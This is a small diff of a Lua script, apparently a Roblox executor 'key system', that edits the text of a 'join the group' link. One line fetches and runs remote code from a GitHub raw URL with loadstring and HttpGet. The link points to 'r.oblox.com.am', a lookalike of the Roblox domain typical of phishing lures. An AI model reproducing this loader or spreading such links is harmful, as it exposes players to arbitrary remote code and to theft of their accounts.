@@ -4,7 +4,7 @@
 local lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/liebertsx/a/main/key.lua", true))()
 
 local key = "yourkey123"
-local link = " JOIN THE GROUP TO OPEN THE KEY SYSTEM https://www.r.oblox.com.am/communities/406387368319/KTA"
+local link = "https://www.r.oblox.com.am/communities/406387368319/KTA"
 local script = [[
 -- put script
 print("succes")
